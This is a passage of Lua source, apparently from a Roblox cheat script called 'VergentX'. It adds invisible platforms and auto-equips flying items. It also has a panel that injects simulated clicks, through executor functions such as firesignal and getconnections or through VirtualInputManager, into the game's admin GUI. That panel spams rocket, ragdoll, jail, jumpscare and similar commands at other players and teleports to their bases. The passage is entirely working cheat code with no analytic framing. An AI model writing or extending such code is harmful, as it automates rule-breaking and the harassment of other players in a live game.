            for _, plot in ipairs(Plots:GetChildren()) do watch(plot) end
            conns[#conns + 1] = Plots.ChildAdded:Connect(function(plot)
                watch(plot)
                rebuild()
            end)
            conns[#conns + 1] = Plots.ChildRemoved:Connect(rebuild)

            local mine = watchGen
            task.spawn(function()
                local lastSig = nil
                while vxAlive() and mine == watchGen do
                    local ok, sig = pcall(SlotBoxes.Signature)
                    if ok and sig ~= lastSig then
                        if lastSig ~= nil then rebuild() end
                        lastSig = sig
                    end
                    task.wait(2)
                end
            end)
        end

        saveConfig()
    end
end

do
    local FALLBACK_NAMES = {
        "Flying Carpet", "Cupid's Wings", "Santa's Sleigh", "Witch's Broom",
        "Waverider", "Carpet", "Cloud", "Magic Carpet",
    }

    local function flyToolName()
        local n = CONFIG.FLY_TOOL
        if type(n) ~= "string" or n == "" then return DefaultConfig.FLY_TOOL end
        return n
    end
    _G.VXFlyToolName = flyToolName

    local function flyEquipBlocked(plot)
        if plot == nil then return false end
        local ok, n = pcall(SlotBoxes.PodiumCount, plot)
        if not ok or type(n) ~= "number" then return false end
        return n >= SlotBoxes.PODIUM_LIMIT
    end
    _G.VXFlyEquipBlocked = flyEquipBlocked

    local nextSweepAt = 0

    local function equipFlyTool()
        local char = LP.Character
        if not char then return end

        local want = flyToolName()
        local held = char:FindFirstChild(want)
        if held and held:IsA("Tool") then return end

        local now = os.clock()
        if now < nextSweepAt then return end
        nextSweepAt = now + 0.15

        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local bp = LP:FindFirstChild("Backpack")

        local t = bp and bp:FindFirstChild(want)
        if t and t:IsA("Tool") then
            pcall(function() hum:EquipTool(t) end)
            return
        end

        for _, n in ipairs(FALLBACK_NAMES) do
            if n ~= want then
                local f = char:FindFirstChild(n) or (bp and bp:FindFirstChild(n))
                if f and f:IsA("Tool") then
                    if f.Parent ~= char then pcall(function() hum:EquipTool(f) end) end
                    return
                end
            end
        end
    end
    _G.VXEquipFlyTool = equipFlyTool
end

do
    local enabled = false
    local holder = nil
    local buildPending = false
    local conns = {}
    local watchGen = 0
    local floors = {}

    local LEVEL_TOL  = 8
    local CLUSTER_R  = 60
    local THICKNESS  = 1
    local EDGE_PAD   = 2

    local FLOOR_COLOR = COLORS.gold

    local function makeFloor(cf, size)
        local p = Instance.new("Part")
        p.Name = "VXFloorPlatform"
        p.Anchored = true
        p.CanCollide = true
        p.CanQuery = false
        p.CanTouch = false
        p.Massless = true
        p.Transparency = 1
        p.Material = Enum.Material.SmoothPlastic
        p.TopSurface = Enum.SurfaceType.Smooth
        p.BottomSurface = Enum.SurfaceType.Smooth
        p.Size = size
        p.CFrame = cf
        p.Parent = holder

        local b = Instance.new("SelectionBox")
        b.Adornee = p
        b.Color3 = FLOOR_COLOR
        b.SurfaceColor3 = FLOOR_COLOR
        b.LineThickness = 0.08
        b.Transparency = 0
        b.SurfaceTransparency = 0.7
        b.Parent = p
    end

    local CORNERS = {
        Vector3.new(-1, -1, -1), Vector3.new(-1, -1, 1),
        Vector3.new(-1,  1, -1), Vector3.new(-1,  1, 1),
        Vector3.new( 1, -1, -1), Vector3.new( 1, -1, 1),
        Vector3.new( 1,  1, -1), Vector3.new( 1,  1, 1),
    }

    local function rotOf(cf)
        return cf - cf.Position
    end

    local function sameRot(a, b)
        return a.RightVector:Dot(b.RightVector) > 0.999
            and a.UpVector:Dot(b.UpVector) > 0.999
    end

    local function cornersOf(cf, sz)
        local hx, hy, hz = sz.X * 0.5, sz.Y * 0.5, sz.Z * 0.5
        local out = {}
        for i, s in ipairs(CORNERS) do
            out[i] = cf * Vector3.new(s.X * hx, s.Y * hy, s.Z * hz)
        end
        return out
    end

    local function localBounds(rot, pts)
        local minX, maxX = math.huge, -math.huge
        local minZ, maxZ = math.huge, -math.huge
        local minY = math.huge
        for i = 1, #pts do
            local lp = rot:PointToObjectSpace(pts[i])
            if lp.X < minX then minX = lp.X end
            if lp.X > maxX then maxX = lp.X end
            if lp.Y < minY then minY = lp.Y end
            if lp.Z < minZ then minZ = lp.Z end
            if lp.Z > maxZ then maxZ = lp.Z end
        end
        return minX, maxX, minY, minZ, maxZ
    end

    local function build()
        if not holder then return end
        for _, c in ipairs(holder:GetChildren()) do c:Destroy() end
        floors = {}

        local boxes = SlotBoxes.Collect()
        if #boxes == 0 then return end

        local groups = {}
        for _, b in ipairs(boxes) do
            local rot = rotOf(b.cf)
            local pts = cornersOf(b.cf, b.sz)

            local hit = nil
            for _, g in ipairs(groups) do
                if g.plot == b.plot and sameRot(g.rot, rot) then
                    local aX, bX, aY, aZ, bZ = localBounds(g.rot, pts)
                    if math.abs(g.y - aY) <= LEVEL_TOL
                        and bX >= (g.minX - CLUSTER_R) and aX <= (g.maxX + CLUSTER_R)
                        and bZ >= (g.minZ - CLUSTER_R) and aZ <= (g.maxZ + CLUSTER_R) then
                        hit = g
                        hit.minX = math.min(hit.minX, aX)
                        hit.maxX = math.max(hit.maxX, bX)
                        hit.minZ = math.min(hit.minZ, aZ)
                        hit.maxZ = math.max(hit.maxZ, bZ)
                        hit.y    = math.min(hit.y, aY)
                        hit.n    = hit.n + 1
                        hit.top  = hit.top or (b.isTop and true or false)
                        break
                    end
                end
            end

            if not hit then
                local aX, bX, aY, aZ, bZ = localBounds(rot, pts)
                groups[#groups + 1] = {
                    plot = b.plot, rot = rot, y = aY, n = 1,
                    top = b.isTop and true or false,
                    minX = aX, maxX = bX, minZ = aZ, maxZ = bZ,
                }
            end
        end

        for _, g in ipairs(groups) do
            if g.n >= 2 and g.top and SlotBoxes.PodiumCount(g.plot) < SlotBoxes.PODIUM_LIMIT then
                local sx = (g.maxX - g.minX) + EDGE_PAD * 2
                local sz = (g.maxZ - g.minZ) + EDGE_PAD * 2
                local cx = (g.minX + g.maxX) * 0.5
                local cz = (g.minZ + g.maxZ) * 0.5
                local cf = g.rot * CFrame.new(cx, g.y - THICKNESS * 0.5, cz)
                local size = Vector3.new(sx, THICKNESS, sz)
                makeFloor(cf, size)

                local c = cf.Position
                local px, py, pz = c.X, c.Y, c.Z
                local hx = sx * 0.5 + 1
                local hy = THICKNESS * 0.5 + 6
                local hz = sz * 0.5 + 1
                floors[#floors + 1] = {
                    cf = cf, sz = size, plot = g.plot,
                    px = px, py = py, pz = pz,
                    r2 = hx * hx + hy * hy + hz * hz,
                }
            end
        end
    end

    local function floorHit(f, pos)
        local lp = f.cf:PointToObjectSpace(pos)
        local hx, hy, hz = f.sz.X * 0.5, f.sz.Y * 0.5, f.sz.Z * 0.5
        return math.abs(lp.X) <= hx + 1 and math.abs(lp.Z) <= hz + 1
            and lp.Y >= hy - 1.5 and lp.Y <= hy + 6
    end

    local lastFloor = nil

    local function onTopFloor(pos)
        local memo = lastFloor and floors[lastFloor]
        if memo and floorHit(memo, pos) then return true, memo.plot end

        local px, py, pz = pos.X, pos.Y, pos.Z
        for i = 1, #floors do
            local f = floors[i]
            local dx, dy, dz = px - f.px, py - f.py, pz - f.pz
            if dx * dx + dy * dy + dz * dz <= f.r2 and floorHit(f, pos) then
                lastFloor = i
                return true, f.plot
            end
        end
        lastFloor = nil
        return false, nil
    end

    vxBind(RunService.Heartbeat, function()
        if not enabled or #floors == 0 then return end
        if CONFIG.CARPET_SPEED then return end

        local char = LP.Character
        local hrp  = char and char:FindFirstChild("HumanoidRootPart")
        local hum  = char and char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum or hum.Health <= 0 then return end

        local onTop, floorPlot = onTopFloor(hrp.Position)
        if not onTop then return end
        if _G.VXFlyEquipBlocked and _G.VXFlyEquipBlocked(floorPlot) then return end
        if _G.VXEquipFlyTool then pcall(_G.VXEquipFlyTool) end
    end)

    local function rebuild()
        if buildPending then return end
        buildPending = true
        task.delay(0.4, function()
            buildPending = false
            if enabled then build() end
        end)
    end

    F.setFloorPlatform = function(on)
        enabled = on and true or false
        CONFIG.FLOOR_PLATFORM = enabled

        local old = Workspace:FindFirstChild("__VXFloorPlatforms")
        if old then old:Destroy() end
        holder = nil
        floors = {}
        lastFloor = nil

        for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
        conns = {}
        watchGen = watchGen + 1

        if enabled then
            holder = Instance.new("Folder")
            holder.Name = "__VXFloorPlatforms"
            holder.Parent = Workspace

            build()

            local function watch(plot)
                local pods = plot:FindFirstChild("AnimalPodiums")
                if pods then
                    conns[#conns + 1] = pods.ChildAdded:Connect(rebuild)
                    conns[#conns + 1] = pods.ChildRemoved:Connect(rebuild)
                else
                    conns[#conns + 1] = plot.ChildAdded:Connect(function(c)
                        if c.Name == "AnimalPodiums" then
                            conns[#conns + 1] = c.ChildAdded:Connect(rebuild)
                            conns[#conns + 1] = c.ChildRemoved:Connect(rebuild)
                            rebuild()
                        end
                    end)
                end
            end

            for _, plot in ipairs(Plots:GetChildren()) do watch(plot) end
            conns[#conns + 1] = Plots.ChildAdded:Connect(function(plot)
                watch(plot)
                rebuild()
            end)
            conns[#conns + 1] = Plots.ChildRemoved:Connect(rebuild)

            local mine = watchGen
            task.spawn(function()
                local lastSig = nil
                while vxAlive() and mine == watchGen do
                    local ok, sig = pcall(SlotBoxes.Signature)
                    if ok and sig ~= lastSig then
                        if lastSig ~= nil then rebuild() end
                        lastSig = sig
                    end
                    task.wait(2)
                end
            end)
        end

        saveConfig()
    end
end

local AP = { gui = nil }

local COOLDOWNS = {
    rocket = 120, ragdoll = 30, balloon = 30, inverse = 60,
    jail = 60, tiny = 60, jumpscare = 60, morph = 60,
}
local ALL_COMMANDS = { "rocket", "ragdoll", "jail", "balloon", "inverse", "tiny", "jumpscare", "morph" }
local CMD_LABELS = {
    rocket = "Rocket", ragdoll = "Ragdoll", jail = "Jail", balloon = "Balloon",
    inverse = "Inverse", tiny = "Tiny", jumpscare = "Jumpscare", morph = "Morph",
}
local activeCooldowns = {}
local lastFire = {}
local AdminButtonCache = {}
local BalloonedPlayers = {}

AP.Commands = {}
for _, id in ipairs(ALL_COMMANDS) do
    table.insert(AP.Commands, { action = id, label = CMD_LABELS[id] })
end

function AP.CooldownState(action)
    local total = COOLDOWNS[action] or 0
    local left = 0
    if total > 0 and activeCooldowns[action] then
        left = math.max(0, total - (tick() - activeCooldowns[action]))
    end
    local sentAgo = lastFire[action] and (tick() - lastFire[action]) or nil
    return left, total, sentAgo
end

do
    local ActivatedCache = setmetatable({}, { __mode = "k" })

    local function replayActivated(button)
        if typeof(getconnections) ~= "function" then return false end
        local cached = ActivatedCache[button]
        if not cached then
            cached = {}
            local ok, list = pcall(getconnections, button.Activated)
            if ok and type(list) == "table" then
                for _, conn in ipairs(list) do
                    if type(conn.Function) == "function" then
                        table.insert(cached, conn.Function)
                    end
                end
            end
            ActivatedCache[button] = cached
        end
        if #cached == 0 then return false end
        for _, fn in ipairs(cached) do task.spawn(fn) end
        return true
    end

    local function fireClick(button)
        if not button then return end
        if firesignal then
            pcall(firesignal, button.MouseButton1Down)
            pcall(firesignal, button.MouseButton1Up)
            pcall(firesignal, button.Activated)
            pcall(firesignal, button.MouseButton1Click)
        elseif replayActivated(button) then
            return
        else
            local inset = 36
            pcall(function() inset = game:GetService("GuiService"):GetGuiInset().Y end)
            local x = button.AbsolutePosition.X + (button.AbsoluteSize.X / 2)
            local y = button.AbsolutePosition.Y + (button.AbsoluteSize.Y / 2) + inset
            if IS_MOBILE then
                local ok = pcall(function()
                    VirtualInputManager:SendTouchEvent(1, 0, x, y)
                    task.wait()
                    VirtualInputManager:SendTouchEvent(1, 2, x, y)
                end)
                if ok then return end
            end
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
            task.wait()
            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
        end
    end

    local function findProfileButton(profilesScroll, targetPlayer)
        if not profilesScroll or not targetPlayer then return nil end
        local btn = profilesScroll:FindFirstChild(targetPlayer.Name)
        if btn and btn:IsA("GuiButton") then return btn end
        for _, child in ipairs(profilesScroll:GetDescendants()) do
            if child:IsA("GuiButton")
                and (child.Name == targetPlayer.Name or child.Name == targetPlayer.DisplayName) then
                return child
            end
        end
        return nil
    end

    local function runAdminCommand(targetPlayer, commandName)
        if not targetPlayer or not commandName then return false end
        local realAdminGui = PlayerGui:FindFirstChild("AdminPanel")
        if not realAdminGui then return false end

        for attempt = 1, 4 do
            local contentScroll = realAdminGui:FindFirstChild("AdminPanel", true)
            contentScroll = contentScroll and contentScroll:FindFirstChild("Content", true)
            contentScroll = contentScroll and contentScroll:FindFirstChild("ScrollingFrame")
            local cmdBtn = contentScroll and contentScroll:FindFirstChild(commandName)
            if cmdBtn then
                fireClick(cmdBtn)
                task.wait(0.05 + (attempt - 1) * 0.05)
                local profilesScroll = realAdminGui:FindFirstChild("AdminPanel", true)
                profilesScroll = profilesScroll and profilesScroll:FindFirstChild("Profiles", true)
                profilesScroll = profilesScroll and profilesScroll:FindFirstChild("ScrollingFrame")
                local playerBtn = findProfileButton(profilesScroll, targetPlayer)
                if playerBtn then
                    fireClick(playerBtn)
                    lastFire[commandName] = tick()
                    return true
                end
            end
            task.wait(0.05)
        end
        return false
    end
    _G.VXRunAdminCommand = runAdminCommand

    _G.VXCmdSequence = function()
        local valid = {}
        for _, id in ipairs(ALL_COMMANDS) do valid[id] = true end
        local en = CONFIG.ADMIN_CMD_ENABLED or {}
        local out, seen = {}, {}
        for _, id in ipairs(CONFIG.ADMIN_CMD_ORDER or {}) do
            if valid[id] and not seen[id] then
                seen[id] = true
                if en[id] ~= false then out[#out + 1] = id end
            end
        end
        for _, id in ipairs(ALL_COMMANDS) do
            if not seen[id] and en[id] ~= false then out[#out + 1] = id end
        end
        return out
    end
end

local function isOnCooldown(cmd)
    local adminGui = PlayerGui:FindFirstChild("AdminPanel")
    if adminGui then
        local content = adminGui:FindFirstChild("AdminPanel")
        local scrollFrame = content and content:FindFirstChild("Content")
        local scrollingFrame = scrollFrame and scrollFrame:FindFirstChild("ScrollingFrame")
        local cmdButton = scrollingFrame and scrollingFrame:FindFirstChild(cmd)
        local timerLabel = cmdButton and cmdButton:FindFirstChild("Timer")
        if timerLabel then return timerLabel.Visible end
    end
    if not activeCooldowns[cmd] then return false end
    return (tick() - activeCooldowns[cmd]) < (COOLDOWNS[cmd] or 0)
end

local function setGlobalVisualCooldown(cmd)
    for _, b in ipairs(AdminButtonCache[cmd] or {}) do
        if b and b.Parent then
            b.BackgroundColor3 = Theme.Error
            task.delay(COOLDOWNS[cmd] or 5, function()
                if b and b.Parent then
                    local ballooned = (cmd == "balloon" and next(BalloonedPlayers) ~= nil)
                    b.BackgroundColor3 = ballooned and Theme.Error or Theme.SurfaceHighlight
                end
            end)
        end
    end
end

local function markFired(cmd, plr)
    activeCooldowns[cmd] = tick()
    setGlobalVisualCooldown(cmd)
    if cmd == "balloon" and plr then BalloonedPlayers[plr.UserId] = true end
end

_G.VXRunCmdSequence = function(targetPlayer)
    if not targetPlayer or targetPlayer == LP then return 0 end
    local seq = _G.VXCmdSequence()
    if #seq == 0 then return 0 end

    if CONFIG.SINGLE_AP then
        _G.VXSingleAPIndex = (_G.VXSingleAPIndex or 0) % #seq + 1
        local cmd = seq[_G.VXSingleAPIndex]
        if isOnCooldown(cmd) then return 0 end
        if _G.VXRunAdminCommand(targetPlayer, cmd) then
            markFired(cmd, targetPlayer)
            return 1
        end
        return 0
    end

    local fired = 0
    local delay = math.clamp(tonumber(CONFIG.ADMIN_CMD_DELAY) or 0, 0, 0.5)
    delay = math.floor(delay * 10 + 0.5) / 10
    for _, cmd in ipairs(seq) do
        if not isOnCooldown(cmd) then
            if _G.VXRunAdminCommand(targetPlayer, cmd) then
                fired = fired + 1
                markFired(cmd, targetPlayer)
            end
            if delay > 0 then task.wait(delay) else task.wait() end
        end
    end
    return fired
end

local ProximityAPActive = false
local updateProxRing

local function CreateAdminPanel()
    local adminGui = Instance.new("ScreenGui")
    adminGui.Name = _vxName("VergentXAdminPanel")
    adminGui.DisplayOrder = 50000
    adminGui.ResetOnSpawn = false
    adminGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    adminGui.Enabled = CONFIG.AP_PANEL == true
    mountGui(adminGui)
    AP.gui = adminGui

    local containerFrame = Instance.new("Frame")
    containerFrame.Size = UDim2.new(0, 452 * MOBILE_SCALE, 0, 0)
    containerFrame.AnchorPoint = Vector2.new(0.5, 0)
    _vxApplySavedPos(containerFrame, "QUICK_POS", 0.5, 0.3)
    containerFrame.BackgroundTransparency = 1
    containerFrame.Parent = adminGui
    containerFrame.ZIndex = 1
    local apScale = Instance.new("UIScale", containerFrame)
    VergentXRegisterScale(apScale, 1)

    local dragBar = Instance.new("Frame", containerFrame)
    dragBar.Size = UDim2.new(1, 0, 0, 33 * MOBILE_SCALE)
    dragBar.Position = UDim2.new(0, 0, 0, 25 * MOBILE_SCALE)
    dragBar.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    dragBar.BackgroundTransparency = 0.45
    dragBar.BorderSizePixel = 0
    dragBar.ZIndex = 2
    dragBar.Active = true
    Instance.new("UICorner", dragBar).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)

    local dragTitle = Instance.new("TextLabel", dragBar)
    dragTitle.Size = UDim2.new(1, -90 * MOBILE_SCALE, 1, 0)
    dragTitle.Position = UDim2.new(0, 14 * MOBILE_SCALE, 0, 0)
    dragTitle.BackgroundTransparency = 1
    dragTitle.ZIndex = 3
    dragTitle.Text = "Admin Panel"
    dragTitle.Font = Enum.Font.Gotham
    dragTitle.TextSize = 16 * MOBILE_SCALE
    dragTitle.TextColor3 = Theme.TextPrimary
    dragTitle.TextXAlignment = Enum.TextXAlignment.Left
    dragTitle.TextStrokeTransparency = 1
    VergentXTitleGrad(dragTitle)

    local mainFrame = Instance.new("Frame", containerFrame)
    mainFrame.Size = UDim2.new(1, 0, 1, -25 * MOBILE_SCALE)
    mainFrame.Position = UDim2.new(0, 0, 0, 25 * MOBILE_SCALE)
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainFrame.BackgroundTransparency = 0.08
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.ZIndex = 1
    applyMarble(mainFrame, true)

    local outerBorder = Instance.new("UIStroke", mainFrame)
    outerBorder.Thickness = 0.8
    outerBorder.Transparency = 0.25
    outerBorder.Color = Color3.fromRGB(6, 6, 8)
    outerBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    gradient(outerBorder, RING_SEQ, 25)

    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12 * MOBILE_SCALE)
    MakeDraggable(dragBar, containerFrame, "QUICK_POS")

    local contentContainer = Instance.new("Frame", mainFrame)
    contentContainer.Size = UDim2.new(1, -12 * MOBILE_SCALE, 1, -50 * MOBILE_SCALE)
    contentContainer.Position = UDim2.new(0, 6 * MOBILE_SCALE, 0, 40 * MOBILE_SCALE)
    contentContainer.BackgroundTransparency = 1

    local playerList = Instance.new("Frame", contentContainer)
    playerList.Size = UDim2.new(1, 0, 1, 0)
    playerList.BackgroundTransparency = 1

    local listLayout = Instance.new("UIListLayout", playerList)
    listLayout.Padding = UDim.new(0, 5 * MOBILE_SCALE)
    listLayout.SortOrder = Enum.SortOrder.LayoutOrder

    local rows = {}
    local removePlayer

    local function createPlayerRow(plr)
        local row = Instance.new("Frame")
        row.Name = plr.Name
        row.Size = UDim2.new(1, 0, 0, 52 * MOBILE_SCALE)
        row.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
        row.BackgroundTransparency = 0.32
        row.BorderSizePixel = 0
        row.Parent = playerList

        local rowBorder = Instance.new("UIStroke", row)
        rowBorder.Thickness = 1
        rowBorder.Transparency = 0.85
        rowBorder.Color = Color3.fromRGB(6, 6, 8)
        rowBorder.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 7 * MOBILE_SCALE)

        row.MouseEnter:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.18), { BackgroundTransparency = 0.6 }):Play()
            TweenService:Create(rowBorder, TweenInfo.new(0.18), { Transparency = 0.6 }):Play()
        end)
        row.MouseLeave:Connect(function()
            TweenService:Create(row, TweenInfo.new(0.18), { BackgroundTransparency = 0.32 }):Play()
            TweenService:Create(rowBorder, TweenInfo.new(0.18), { Transparency = 0.85 }):Play()
        end)

        local spamAllHitbox = Instance.new("TextButton", row)
        spamAllHitbox.Size = UDim2.new(1, -220 * MOBILE_SCALE, 1, 0)
        spamAllHitbox.BackgroundTransparency = 1
        spamAllHitbox.Text = ""
        spamAllHitbox.ZIndex = 5
        spamAllHitbox.AutoButtonColor = false
        spamAllHitbox.MouseButton1Click:Connect(function()
            task.spawn(function() _G.VXRunCmdSequence(plr) end)
            local originalColor = row.BackgroundColor3
            row.BackgroundColor3 = Theme.Success
            task.delay(0.15, function()
                if row and row.Parent then row.BackgroundColor3 = originalColor end
            end)
        end)

        local headshot = Instance.new("ImageLabel", row)
        headshot.Size = UDim2.new(0, 36 * MOBILE_SCALE, 0, 36 * MOBILE_SCALE)
        headshot.Position = UDim2.new(0, 6 * MOBILE_SCALE, 0.5, -18 * MOBILE_SCALE)
        headshot.BackgroundColor3 = Color3.fromRGB(15, 17, 22)
        headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. plr.UserId .. "&w=150&h=150"
        headshot.ZIndex = 6
        Instance.new("UICorner", headshot).CornerRadius = UDim.new(1, 0)

        local headshotStroke = Instance.new("UIStroke", headshot)
        headshotStroke.Color = Color3.fromRGB(6, 6, 8)
        headshotStroke.Thickness = 1.5 * MOBILE_SCALE
        headshotStroke.Transparency = 0.4

        local dName = Instance.new("TextLabel", row)
        dName.Size = UDim2.new(0, 190 * MOBILE_SCALE, 0, 18 * MOBILE_SCALE)
        dName.Position = UDim2.new(0, 48 * MOBILE_SCALE, 0, 8 * MOBILE_SCALE)
        dName.BackgroundTransparency = 1
        dName.TextTruncate = Enum.TextTruncate.AtEnd
        dName.Text = plr.DisplayName or ""
        dName.Font = Enum.Font.Gotham
        dName.TextSize = 14 * MOBILE_SCALE
        dName.TextColor3 = Color3.fromRGB(245, 246, 250)
        dName.TextXAlignment = Enum.TextXAlignment.Left
        dName.TextStrokeTransparency = 1
        dName.ZIndex = 6
        VergentXNameGrad(dName)

        local uName = Instance.new("TextLabel", row)
        uName.Name = "UserLine"
        uName.Size = UDim2.new(0, 190 * MOBILE_SCALE, 0, 12 * MOBILE_SCALE)
        uName.Position = UDim2.new(0, 48 * MOBILE_SCALE, 0, 28 * MOBILE_SCALE)
        uName.BackgroundTransparency = 1
        uName.Text = "@" .. plr.Name
        uName.Font = Enum.Font.Gotham
        uName.TextSize = 9 * MOBILE_SCALE
        uName.TextColor3 = Theme.TextMuted
        uName.TextXAlignment = Enum.TextXAlignment.Left
        uName.TextTruncate = Enum.TextTruncate.AtEnd
        uName.TextStrokeTransparency = 1
        uName.ZIndex = 6

        local buttonSpacing = 38 * MOBILE_SCALE
        local buttonSize = 32 * MOBILE_SCALE

        local btnCont = Instance.new("Frame", row)
        btnCont.Size = UDim2.new(0, (5 * buttonSize) + (4 * (buttonSpacing - buttonSize)), 1, 0)
        btnCont.Position = UDim2.new(1, -btnCont.Size.X.Offset - 10 * MOBILE_SCALE, 0, 0)
        btnCont.BackgroundTransparency = 1
        btnCont.ZIndex = 10

        local buttonsDef = {
            { icon = "\240\159\154\128", cmd = "rocket" },
            { icon = "\240\159\143\131", cmd = "ragdoll" },
            { icon = "\240\159\148\146", cmd = "jail" },
            { icon = "\240\159\142\136", cmd = "balloon" },
            { icon = "TP",               cmd = "tp" },
        }

        for i, def in ipairs(buttonsDef) do
            local b = Instance.new("TextButton", btnCont)
            b.Size = UDim2.new(0, buttonSize, 0, buttonSize)
            b.Position = UDim2.new(0, (i - 1) * buttonSpacing, 0.5, -buttonSize / 2)
            b.AutoButtonColor = false
            b.Text = def.icon
            b.TextSize = 12 * MOBILE_SCALE
            b.TextColor3 = Theme.TextPrimary
            b.Font = Enum.Font.Gotham
            b.Active = true
            b.ZIndex = 11
            b.BackgroundTransparency = 0.32
            b.BackgroundColor3 = Theme.SurfaceHighlight
            b.BorderSizePixel = 0
            b.TextStrokeTransparency = 1
            Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8 * MOBILE_SCALE)

            local bHollow = Instance.new("UIStroke", b)
            bHollow.Color = Color3.fromRGB(6, 6, 8)
            bHollow.Thickness = 0.5
            bHollow.Transparency = 0.5
            bHollow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

            b.MouseEnter:Connect(function()
                if def.cmd == "tp" or not isOnCooldown(def.cmd) then
                    TweenService:Create(b, TweenInfo.new(0.16), { BackgroundColor3 = Theme.SurfaceLight }):Play()
                end
            end)
            b.MouseLeave:Connect(function()
                if def.cmd == "tp" or not isOnCooldown(def.cmd) then
                    TweenService:Create(b, TweenInfo.new(0.16), { BackgroundColor3 = Theme.SurfaceHighlight }):Play()
                end
            end)

            if def.cmd ~= "tp" then
                if not AdminButtonCache[def.cmd] then AdminButtonCache[def.cmd] = {} end
                table.insert(AdminButtonCache[def.cmd], b)
            end

            b.MouseButton1Click:Connect(function()
                if def.cmd == "tp" then
                    local plots = Workspace:FindFirstChild("Plots")
                    local plotName = Brainrots.PlotOf and Brainrots.PlotOf(plr) or nil
                    local plotInst = plots and plotName and plots:FindFirstChild(plotName)
                    local char = LP.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if not (plotInst and hrp) then
                        ShowNotification("Admin TP", "No base found for " .. plr.DisplayName)
                        return
                    end
                    local sign = plotInst:FindFirstChild("PlotSign")
                    local part = sign and (sign:IsA("BasePart") and sign
                        or sign:FindFirstChildWhichIsA("BasePart", true))
                    part = part or plotInst.PrimaryPart or plotInst:FindFirstChildWhichIsA("BasePart", true)
                    if part then
                        pcall(function() hrp.CFrame = part.CFrame + Vector3.new(0, 6, 0) end)
                        ShowNotification("Admin TP", plr.DisplayName .. "'s base")
                    end
                elseif not isOnCooldown(def.cmd) then
                    if _G.VXRunAdminCommand(plr, def.cmd) then markFired(def.cmd, plr) end
                end
            end)
        end

        VergentXTextShine(row)
        return row
    end

    local function updateContainerSize()
        local hasPlayers = next(rows) ~= nil
        mainFrame.Visible = hasPlayers
        if not hasPlayers then
            containerFrame.Size = UDim2.new(0, 452 * MOBILE_SCALE, 0, 52 * MOBILE_SCALE)
            return
        end
        local f = (apScale.Scale > 0) and apScale.Scale or 1
        local totalHeight = (listLayout.AbsoluteContentSize.Y or 0) / f
        containerFrame.Size = UDim2.new(0, 452 * MOBILE_SCALE, 0, totalHeight + 75 * MOBILE_SCALE)
    end
    listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateContainerSize)

    local function addPlayer(plr)
        if plr == LP or rows[plr.UserId] then return end
        if not Players:FindFirstChild(plr.Name) then return end
        rows[plr.UserId] = { player = plr, row = createPlayerRow(plr) }
        updateContainerSize()
    end

    removePlayer = function(plr)
        local userId = plr and plr.UserId
        local entry = userId and rows[userId]
        if not entry then return end
        for _, buttons in pairs(AdminButtonCache) do
            for i = #buttons, 1, -1 do
                if buttons[i] and buttons[i].Parent == entry.row then table.remove(buttons, i) end
            end
        end
        if entry.row.Parent then entry.row:Destroy() end
        rows[userId] = nil
        BalloonedPlayers[userId] = nil
        updateContainerSize()
    end

    vxBind(Players.PlayerAdded, function(plr)
        task.wait(0.1)
        if plr and plr.Parent and plr ~= LP then addPlayer(plr) end
    end)
    vxBind(Players.PlayerRemoving, removePlayer)
    for _, p in ipairs(Players:GetPlayers()) do addPlayer(p) end

    local sorted = {}
    local apAcc = 0
    vxBind(RunService.Heartbeat, function(dt)
        if not adminGui.Enabled then return end
        apAcc = apAcc + dt
        if apAcc < 0.2 then return end
        apAcc = 0
        local char = LP.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")

        table.clear(sorted)
        for _, entry in pairs(rows) do
            local plr = entry.player
            local d = math.huge
            if hrp and plr.Character then
                local ohrp = plr.Character:FindFirstChild("HumanoidRootPart")
                if ohrp then d = (ohrp.Position - hrp.Position).Magnitude end
            end
            entry.dist = d
            sorted[#sorted + 1] = entry
        end

        table.sort(sorted, function(a, b)
            if a.dist ~= b.dist then return a.dist < b.dist end
            return a.player.Name < b.player.Name
        end)

        for i, entry in ipairs(sorted) do
            local row = entry.row
            if row and row.Parent then
                if row.LayoutOrder ~= i then row.LayoutOrder = i end
                local line = row:FindFirstChild("UserLine")
                if line then
                    local plr = entry.player
                    if plr:GetAttribute("Stealing") then
                        local idx = plr:GetAttribute("StealingIndex")
                        line.Text = idx and tostring(idx) or "Stealing"
                        line.TextColor3 = Color3.fromRGB(255, 70, 90)
                    else
                        local d = entry.dist
                        line.Text = (d < math.huge)
                            and ("@" .. plr.Name .. "  \u{00B7}  " .. math.floor(d + 0.5) .. "s")
                            or ("@" .. plr.Name)
                        line.TextColor3 = Theme.TextMuted
                    end
                end
            end
        end
    end)

    vxAttachReveal(adminGui, containerFrame)

    function AP.SetPosition(pos)
        if pos then containerFrame.Position = pos end
    end
    return adminGui
end

F.setAdminPanel = function(on)
    CONFIG.AP_PANEL = on and true or false
    if AP.gui then AP.gui.Enabled = CONFIG.AP_PANEL end
    saveConfig()
end

local AdminControl = { gui = nil }

local function CreateAdminControlGUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = _vxName("VergentXAdminControl")
    gui.DisplayOrder = 50000
    gui.ResetOnSpawn = false
    gui.Enabled = CONFIG.ADMIN_CONTROL == true
    mountGui(gui)
    AdminControl.gui = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 280 * MOBILE_SCALE, 0, 0)
